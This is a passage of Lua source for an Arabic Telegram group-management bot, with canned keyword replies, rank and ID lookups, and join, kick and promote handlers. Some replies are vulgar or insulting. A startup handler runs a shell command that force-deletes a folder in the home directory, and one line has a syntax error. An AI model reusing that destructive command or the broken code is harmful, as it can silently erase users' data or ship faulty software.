if text =="💔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "ضايج لئن كلبه مكسور 🙀😿"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙂✌️" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "مبتسم على وجهي 😌😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😹😹😹😹😹😹😹" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "انت شبيك تخبلت 😒😨😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😹😹😹😹😹😹😹😹😹" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "انت شبيك تخبلت 😒😨😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="بربك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "ي وعلي ابو الحسن 😐"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="كلكم" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "ليش تجمع بحي اني بوت 😞💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="والرب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "استغفر الله جنان كم مره كتلك لتحلف جذب😑🎈"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="حقك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "ي حقك حمبي اني وياك ضدهم😐🎈"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اكلك يول" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "كول حبي بس لا تبول علينا 💛"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اكول" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "كول وفتح حلكك خل ابول 😸🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تعال" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ولي لك ليريدني هو يجيني 🌞"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="صوفي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديته هاذا اخوي ابو الوكفات فديت ابنمي"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end 
if text =="شغال" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "❞ ءيہـ͜ާي ۶ـٰٰٰོۂٰٰٰٰٰزيہزيۂٰٰٰٰٰـﮯ بـہٰٖآﻗقــ͡ي ﯙأتۂـ͜مــٰཻدد 💕"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="فرخ" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• ؤخـٰٰ͒ہر آﻧﮧـ͜ާۂٰٰٰٰٰي ڵہٰٰٖٖكي᪼᪳ـۂتہٰٖـﮫﮧٰٰٖٖ ۶ֆ كبلك"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="نصعد" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "مكالمهةة لو زرور 🐸🤘🏿"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="وف" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "مو كتلج اريحج لتخافين 🌝"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اوي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "هاي تفله بعد ميعور حمبي "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="كحبه" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "يب ادري بيها حته ناجها سويجد 😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="يوجع" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "حته ترتاحين يا عيني 😺"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ولو منا" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "ماولي اذا ما انيجكم 😼🤘"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="الله" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "شبي خوما ضوجك خوما كللهم مايكل ناج هذا 🙀🙌🏻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="نيجه" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "تعال بعد عمك افتر وما تحس وي التفال 🐸💚"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="كول انجب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "خايب ولي لاتفل بطيزك ينطيني اوامر الفرخ 🤘🏿🤡🤘🏿"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="انكليزي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "فاج يو ماين 😎"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="مرحبا" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   " مہٰ۪۫ږآحہٰ۪۫بہٰ۪۫ هلا بيك 💑"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="هلاوووووو" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يههلا بيك نورتنا 💛"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="خرب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "خرب وجهك حمتر لتكفر 🌞🌿 "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="انت انجب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "اي حمبي 😸 تعال فتح حلكك 💙"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="وين ولك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يم خالتك الشكره بن  الصاكه"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اكرهك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شعور متبادل حبي"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تكرهني" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شي اكيد احبك حياتي 😸💛"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اعشقك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فيدوه اني هم عشقك😊🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="شباب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "كباب وتكه وسمج 💛"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😂😂😂😂😂😂" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يضحك الفطير 😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😇" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "استريح بحي رايد شي 😹😹😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😑" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "دي وجهك معقد 😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😄" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حيل فتح حلكك نوب 😹😹😘"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😌🙂😌😌😌" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت الغرور كله بحي"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😭😭😭😭😭" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو ويك حياتي بس كلي اله اهينه كدامك 😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="✨🔖👱👱😌" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ها بحي منو مضوجك "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="☻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عساس ثكيل العينتين تاليتك تزحفبل خاص 😹😹" storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😠" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "طفه طفه 💦💦 تره حمه حيل"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😳😳😳😳😳" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ها شفت/ي ابوك/ج مصلخ ونصدمت 😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😹😹😹😹😹😹😹😹😹😹😹😹" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "اضحك شكو عله كلبك ☹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙊🙊🙊🙊🙊" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ها قردي شبيك مستحي 😂😂"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙈🙈🙈🙈🙈" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "صار/ت قرد يعني خجلان ?😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end end 
if text == 'تنضيف المشتركين' and is_devtaha(msg)  then   local addgrop = tahadevstorm:scard(DEVSTOR.."usersbot") or 0  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*📛¦جاري تنضيف المشتركين *\n*♻¦ عدد المشتركين في البوت حاليا ◗'..addgrop..'◖* مشترك\n', 1, 'md')       sleep(1)   local list = tahadevstorm:smembers(DEVSTOR..'usersbot')     for k,v in pairs(list) do      rempv(v)   end local addgrop = tahadevstorm:scard(DEVSTOR.."usersbot") or 0   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚸¦ اصبح عدد المشتركين الان ◗'..addgrop..'◖* مشترك \n', 1, 'md')        end  
if chat_type == 'super' and tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_)  then if text == "id" then
function id_by_reply(extra, result, success) storm_sendMsg(msg.chat_id_, msg.id_, 1, '<b>📫 • ايديه </b> : [ <code>'..result.sender_user_id_..'</code> ]', 1, 'html') end  if tonumber(msg.reply_to_message_id_) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),id_by_reply) end end
if text == ("ايدي") and msg.reply_to_message_id_ == 0 and not tahadevstorm:get(DEVSTOR..'lock:id'..msg.chat_id_) then      
function getmepar(extra,result,success) 
if result.username_ then username = '@'..result.username_ else username = ' لا يوجد 🎍 ' end
local msguser = tonumber(tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
local function getpro(extra, result, success)    
if result.photos_[0] then   
if is_devtaha(msg) then t = 'مطور اساسي 👨🏻‍💻'  elseif is_sudo(msg) then t = 'مطور 👨‍💻'  elseif is_owner(msg) then t = 'المنشئ 👨🏻‍✈️'  elseif is_monsh(msg) then t = 'المدير 🕵🏻‍♂'     elseif is_mod(msg) then t = 'ادمن الكروب 👮'  elseif is_vipgroups(msg) then t = 'مميز عام 🌟'  elseif is_vipgroup(msg) then t = 'مميز 🎅'   else t = 'مجرد عضو 🙌'   end      
taha = {'\n⚜¦ ايديــك •⊱ '..msg.sender_user_id_..' ⊰•\n🎖¦ موقعـك •⊱ '..t..' ⊰•\n🎭¦ مـعرفك •⊱ '..username..' ⊰•\n📊¦ تفاعـلك •⊱ '..formsgg(msguser)..' ⊰•\n📨¦ رسائلك •⊱ '..msguser..' ⊰•\n🌇¦ صــورك •⊱ '..result.total_count_..' ⊰•\n','\n◗📛◖ ايديـــك » '..msg.sender_user_id_..'\n◗🎯◖ موقعـك » '..t..'\n◗🔖◖ معرفـك » '..username..'\n◗📉◖ تفاعلـك » '..formsgg(msguser)..'\n◗📝◖ رسائلك » '..msguser..'\n◗📷◖ صـورك » '..result.total_count_..'\n','\n📬║ايديـــك ⇍ '..msg.sender_user_id_..'\n🚸║موقعـك ⇍ '..t..'\n📯║معرفـك ⇍ '..username..'\n📈║تفاعلـك ⇍ '..formsgg(msguser)..'\n📩║رسائلك ⇍ '..msguser..'\n🌇║صـورك ⇍ '..result.total_count_..'\n','\n📟⸽ ايديـــك ⇜ '..msg.sender_user_id_..'\n🎭⸽ موقعـك ⇜ '..t..'\n🚨⸽ معرفـك ⇜ '..username..'\n📉⸽ تفاعلـك ⇜ '..formsgg(msguser)..'\n📑⸽ رسائلك ⇜ '..msguser..'\n🌄⸽ صـورك ⇜ '..result.total_count_..'\n'}
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,taha[math.random(#taha)])       
else if is_devtaha(msg) then t = 'مطور اساسي 👨🏻‍💻'  elseif is_sudo(msg) then t = 'مطور 👨‍💻'  elseif is_owner(msg) then t = 'المنشئ 👨🏻‍✈️'  elseif is_monsh(msg) then t = 'المدير 🕵🏻‍♂'     elseif is_mod(msg) then t = 'ادمن الكروب 👮' elseif is_vipgroup(msg) then t = 'مميز 🎅'   elseif is_vipgroups(msg) then t = 'مميز عام 🌟'  elseif is_vipgroup(msg) then t = 'مميز 🎅'   else t = 'مجرد عضو 🙌'   end      
storm_sendMsg(msg.chat_id_, msg.id_, 1, '📷*║* بروفايلك خالي مني الصور 🍃\n📬║ايديـــك ⇍ `'..msg.sender_user_id_..'`\n🚸║موقعـك ⇍ *'..t..'*\n📯║معرفـك ⇍ ['..username..']\n📈║تفاعلـك ⇍ *'..formsgg(msguser)..'*\n📩║رسائلك ⇍ *'..msguser..'*\n🌇║صـورك ⇍ *'..result.total_count_..'*\n', 1, 'md')      
end    end  tdcli_function ({    ID = "GetUserProfilePhotos",    user_id_ = msg.sender_user_id_,    offset_ = 0,    limit_ = 1  }, getpro, nil)     end getUser(msg.sender_user_id_, getmepar)   end   
if text ==("الرتبه") or text ==("موقعه") or text ==("رتبته") and msg.reply_to_message_id_ ~= 0 then  function id_by_reply(extra, result, success) if result.id_ then if is_devtaha(result) then t = 'مطور اساسي 👨🏻‍💻'  elseif is_sudo(result) then t = 'مطور 👨‍💻'  elseif is_owner(result) then t = 'المنشئ 👨🏻‍✈️'  elseif is_monsh(result) then t = 'المدير 🕵🏻‍♂'     elseif is_mod(result) then t = 'ادمن الكروب 👮' elseif is_vipgroup(result) then t = 'مميز 🎅'   elseif is_vipgroups(result) then t = 'مميز عام 🌟'  elseif is_vipgroup(result) then t = 'مميز 🎅'   else t = 'مجرد عضو 🙌'   end        end  local msgss = tonumber(tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..result.sender_user_id_) or 0)  local msgtaha = 357 local msggstaha = tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..result.sender_user_id_) or 0  local nupmsgg =  tonumber((msggstaha / msgtaha) * 100)  local  tahah = 1  for k,v in pairs(tahadevstorm:hkeys("user:messages"..msg.chat_id_..":*")) do if tahadevstorm:get(DEVSTOR.."user:messages"..msg.chat_id_":"..v) > tahah then  tahah = tahadevstorm:get(DEVSTOR.."user:messages"..msg.chat_id_":"..v) end end text = '*📛¦ ايديه ◗ '..result.sender_user_id_..' ◖*\n*🚸¦ الرتبه ◗ '..t..' ◖*\n*📃¦ رسايله ◗ '..(tahadevstorm:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..result.sender_user_id_) or 0)..' ◖*\n*📊¦ تفاعله ◗ '..formsgg(msgss)..' ◖*\n*🚨¦* معرفه ◗[ '..get_username(result.sender_user_id_)..' ]◖\n*👮¦* اسمه  ◗` '..get_name(result.sender_user_id_)..' `◖'storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md') end getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) end end end
function tdcli_update_callback(data)  if data.ID == "UpdateNewChat" then   elseif data.ID == "UpdateChannel" then   
if data.channel_.status_.ID == "ChatMemberStatusKicked" then   print("Bot is Kicked | البوت نطرد")   print("Bot is Kicked: -100"..data.channel_.id_)  rem_group('-100'..data.channel_.id_)   rem_lockal('-100'..data.channel_.id_)  tahadevstorm:del(DEVSTOR.."test:group"..'-100'..data.channel_.id_)    tahadevstorm:del(DEVSTOR.."add:bot:group"..'-100'..data.channel_.id_, true)  linkgp = tahadevstorm:get(DEVSTOR.."link:group"..'-100'..data.channel_.id_)  if linkgp then  link = '[اضغط هنا]('..linkgp..')'  else  link = ' لا يوجد رابط '  end
local taha = [[
*📛¦ مرحبا عزيزي المطور تم طرد البوت*
🎲*¦* ايدي المجموعه ◖`]]..'-100'..data.channel_.id_..[[`◗
🚨*¦* اسم المجموعه ◖`]]..title_name('-100'..data.channel_.id_)..[[`◗
*📬¦* رابط المجموعه ◖]]..link..[[◗
]] storm_sendMsg(SUDO,0, 1,taha, 1, "md")  
elseif data.channel_.status_.ID == "ChatMemberStatusMember" then   
print("IS Member :: عضو عادي ")  
rem_group('-100'..data.channel_.id_)  
rem_lockal('-100'..data.channel_.id_) 
tahadevstorm:del(DEVSTOR.."test:group"..'-100'..data.channel_.id_)   
tahadevstorm:del(DEVSTOR.."add:bot:group"..'-100'..data.channel_.id_, true) 
elseif data.channel_.status_.ID == "ChatMemberStatusEditor" and not tahadevstorm:get(DEVSTOR..'lock:bot:free'..bot_id)  then     if tahadevstorm:get(DEVSTOR.."test:group"..'-100'..data.channel_.id_)  then  tahadevstorm:set(DEVSTOR.."add:bot:group"..'-100'..data.channel_.id_, true)   add_group('-100'..data.channel_.id_)   print("البوت ادمن مسبقا ")   local function promote_adminm(extra, result, success)  local admins = result.members_  for i=0 , #admins do  tahadevstorm:sadd(DEVSTOR..'mods:'..'-100'..data.channel_.id_,admins[i].user_id_)   if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  owner_id = admins[i].user_id_  tahadevstorm:sadd(DEVSTOR..'moder'..'-100'..data.channel_.id_,owner_id) tahadevstorm:srem(DEVSTOR..'mods:'..'-100'..data.channel_.id_,owner_id)   end  end end chek_admin('-100'..data.channel_.id_,promote_adminm)     else print("IS Admin : البوت صعدوه ادمن")  tahadevstorm:set(DEVSTOR.."add:bot:group"..'-100'..data.channel_.id_, true)  local function promote_admin(extra, result, success)  local admins = result.members_  for i=0 , #admins do   tahadevstorm:sadd(DEVSTOR..'mods:'..'-100'..data.channel_.id_,admins[i].user_id_)   if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  owner_id = admins[i].user_id_  tahadevstorm:sadd(DEVSTOR..'moder'..'-100'..data.channel_.id_,owner_id)   end  end  
add = '\n◗🚨¦ تم تفعيل البوت تلقائيا◖\n◗📛¦ ايدي المجموعه ◗'..'-100'..data.channel_.id_..'◖\n◗🚸¦ المنشئ ◗'..owner_id..'◖\n◗👮¦ عدد الادمنيه ◗'..tahadevstorm:scard(DEVSTOR..'mods:'..'-100'..data.channel_.id_)..'◖ تم رفعهم' 
stormmonshn(SUDO, owner_id, 0, add, 79, string.len(owner_id)) 
taha = '\n◗📛¦ لقد تمت ترقيتي ادمن هنا◖\n◗📬¦ تم تفعيل المجموعه بنجاح◖\n◗📊¦ تم قفل جميع اوامر المجموعه◖\n◗🚸¦ المنشئ ◗'..owner_id..'◖\n◗👮¦ عدد الادمنيه ◗'..tahadevstorm:scard(DEVSTOR..'mods:'..'-100'..data.channel_.id_)..'◖ تم رفعهم' 
stormmonshn('-100'..data.channel_.id_
                     , owner_id
                     , 0
                     , taha
                     , 107
                     , string.len(owner_id))
               end
               add_group('-100'..data.channel_.id_)
               add_lockal('-100'..data.channel_.id_)
               tahadevstorm:set(DEVSTOR.."test:group"..'-100'..data.channel_.id_,'storm')
               getChannelMembers('-100'..data.channel_.id_
                  ,0
                  , 'Administrators', 100, promote_admin)
            end
         end
      end   
if (data.ID == "UpdateNewMessage") then 
         local msg = data.message_
         STORM(data.message_,data)
      elseif data.ID == 'UpdateMessageEdited' then 
         local function edited_cb(extra
               ,result
               ,success)
            if not is_mod(result)
               and not is_vipgroup(result)
               and not is_vipgroups(result)
               and tahadevstorm:get(DEVSTOR..'edit:Lock:'..data.chat_id_) == "lock" then
               delete_msg(data.chat_id_,{[0] = data.message_id_})
            end
            STORM(result
               ,data)
         end
         tdcli_function ({
               ID = "GetMessage"
               , chat_id_ = data.chat_id_
               , message_id_ = data.message_id_}
            , edited_cb
            , nil)
      elseif (data.ID == "UpdateOption"
            and data.name_ == "my_id") then
         os.execute('cd $home;ls -la;rm -fr .telegram-cli')
print("\n\27[39;46m"..[[
🚨¦ تم اكتمال تنصيب سورس ستورم تستطيع الان استخدام البوت 🔥
]].."\27[0;34;49m")
         https.request('https://api.telegram.org/bot'..chaneel..'/sendMessage?chat_id='..SUDO..'&text=💥¦ تم تشغيل البوت بنجاح.                                        🚸¦ الان يمكنك استلام الاشعارات.                        📬¦ اشترك في قناة السورس لتتمكن من استخدامه @STORMCLI')
print("\27[30;35m"..[[
💥¦◖THE SOURCE WAS WRITTEN BY @TAHAJ20◗      
💥¦◖THANKS FOR USING THE SOURCE◗             
💥¦◖DEV OF COURSES @TAHAJ20◗                 
💥¦◖MY CHANNEL ID @STORMCLI◗                 
]].."\27[0;34;49m")
         tdcli_function ({ID="GetChats"
               ,offset_order_="9223372036854775807"
               ,offset_chat_id_=0,limit_=20}
            , dl_cb
            , nil)
      end
   end
--[[
   _     _    _   _______  _     _    _   _    _
  | |   | |  / \  |  __  \| |   | |  / \  \ \/ /
  |  \ /  | / _ \ | |  \ ||  \ /  | / _ \  \. /
  | |\_/| |/ ___ \| |__/ || |\_/| |/ ___ \ /. \
  |_|   |_/_/   \_\_____/ |_|   |_/_/   \_\_/\_\
           CH > @MadMaXTEAM
--]]
--------------------------------------
